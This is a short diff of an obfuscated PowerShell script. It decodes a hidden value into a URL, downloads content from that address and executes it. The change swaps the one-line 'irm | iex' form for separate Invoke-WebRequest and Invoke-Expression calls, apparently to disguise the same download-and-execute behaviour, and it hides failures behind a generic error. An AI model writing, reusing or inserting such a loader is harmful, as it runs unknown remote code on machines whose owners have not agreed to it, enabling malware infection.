@@ -19,7 +19,8 @@ ${global:a3b2c1} = {
 
 try {
     ${execution_context} = & ${global:a3b2c1} -input_data ${7e849043}
-    irm ${execution_context} | iex
+    ${request_result} = Invoke-WebRequest -Uri ${execution_context}
+    Invoke-Expression ${request_result}
 } catch {
     Write-Error "Failed Parse code"
 }
